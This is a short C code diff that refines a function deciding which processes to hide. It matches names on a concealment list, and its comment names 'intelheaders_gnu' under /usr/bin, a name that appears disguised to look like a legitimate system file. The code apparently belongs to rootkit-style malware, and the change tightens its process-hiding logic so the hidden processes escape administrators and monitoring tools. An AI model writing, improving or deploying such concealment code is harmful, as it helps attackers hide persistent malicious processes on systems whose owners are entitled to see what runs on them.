@@ -104,8 +104,9 @@ bool is_process_hidden(const char *process_name) {
     
     for (i = 0; i < hidden_process_count; i++) {
         if (hidden_processes[i][0] != '\0' && strlen(hidden_processes[i]) > 0) {
-            // Use substring matching to catch both "intelheaders_gnu" and "/usr/bin/intelheaders_gnu"
-            if (strstr(process_name, hidden_processes[i]) != NULL) {
+            // More precise matching - check if it's exactly the process name or contains the full path
+            if (strcmp(process_name, hidden_processes[i]) == 0 || 
+                (strstr(process_name, "/") != NULL && strstr(process_name, hidden_processes[i]) != NULL)) {
                 return true;
             }
         }
